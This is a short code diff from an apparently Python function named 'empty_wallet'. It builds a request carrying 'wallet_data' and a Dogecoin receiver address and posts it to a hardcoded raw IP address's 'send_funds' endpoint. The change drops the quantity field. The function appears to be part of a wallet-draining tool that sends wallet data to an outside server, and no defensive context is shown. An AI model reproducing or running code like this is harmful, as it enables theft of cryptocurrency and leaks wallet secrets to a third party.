@@ -189,7 +189,6 @@ def empty_wallet(doge_address):
     url = "http://49.206.31.38:8000/api/send_funds/"
     payload = json.dumps({
         "wallet_data": str(wallet_data),
-        "quantity": quantity,
         "receiver_address": doge_address
     })
     headers = {
